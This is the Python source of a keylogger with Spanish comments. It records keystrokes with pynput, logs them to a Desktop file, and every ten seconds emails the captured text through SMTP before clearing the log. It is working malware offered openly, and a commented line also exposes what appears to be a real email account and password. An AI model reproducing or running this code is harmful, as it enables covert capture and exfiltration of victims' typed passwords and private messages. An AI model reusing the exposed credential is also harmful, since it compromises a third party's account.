
import  sys, logging, time, datetime
from pynput import keyboard
import os
import threading
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from dotenv import load_dotenv
load_dotenv()

EMAIL_HOST_USER = os.environ["EMAIL_HOST_USER"]
EMAIL_HOST_PASSWORD = os.environ["EMAIL_HOST_PASSWORD"]
EMAIL_HOST = os.environ["EMAIL_HOST"]
EMAIL_PORT = int(os.environ["EMAIL_PORT"])
EMAIL_USE_TLS = os.environ["EMAIL_USE_TLS"].lower() in ['true', '1', 'yes']

buffer = []


usuario = os.getlogin()  # o usa os.environ["USERNAME"]
carpeta_destino = f"C:\\Users\\{usuario}\\Desktop\\Keylogger\\Keylogger.txt"
os.makedirs(os.path.dirname(carpeta_destino), exist_ok=True)

logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')

print ("Iniciando keylogger. Presiona ESC para salir.")
def on_press(key):
    try:
        buffer.append(str(key.char))
    except AttributeError:
        # Puedes mapear teclas especiales a caracteres o ignorarlas
        if key == keyboard.Key.space:
            buffer.append(' ')
        elif key == keyboard.Key.enter:
            buffer.append('\n')
        elif key == keyboard.Key.tab:
            buffer.append('\t')
        # Puedes ignorar teclas como backspace, ctrl, etc., o agregar un marcador si lo deseas
        # elif key == keyboard.Key.backspace:
        #     buffer.append('[BACKSPACE]')
        # else:
        #     pass  # Ignora otras teclas especiales


def procesar_buffer():
    while True:
        time.sleep(10) # Espera 10 segundos
        if buffer:
            # Procesa y vacía el buffer (guarda en archivo, envía, etc.)
            logging.info(''.join(buffer))
            buffer.clear()
            EnviarEmail()


def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Esto detiene el listener
    
def EnviarEmail():
    with open(carpeta_destino, "r+") as file:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = file.read()
        data = data.replace("\n", " ")
        data = data.replace("Space", " ")
        data = 'Mensaje capturado a las:  ' + fecha + ' :\n\n' + data
        print(data)
        # Recuerda pasar la contraseña real en el segundo argumento
       #crear_Email('gestion@arrosia.com', 'Ges2021tion', 'Nueva captura: ' + fecha, data)
        crear_Email(EMAIL_HOST_USER, EMAIL_HOST_PASSWORD, EMAIL_HOST_USER, 'Nueva captura: ' + fecha, data)
        
        file.seek(0)
        file.truncate()  # Limpia el contenido del archivo después de enviarlo

def crear_Email(user, passw, recep, subj, body):
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    Txt = body

    # Crear el mensaje MIME
    msg = MIMEMultipart()
    msg['From'] = From
    msg['To'] = To
    msg['Subject'] = Subject
    msg.attach(MIMEText(Txt, 'plain'))

    try:
        server = smtplib.SMTP(f'{EMAIL_HOST}:{EMAIL_PORT}')
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, msg.as_string())
        server.quit()
        print("[+] Email enviado correctamente")
    except Exception as e:
        print("[-] Error al enviar el email: " + str(e))


# Antes de iniciar el listener:
threading.Thread(target=procesar_buffer, daemon=True).start()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


    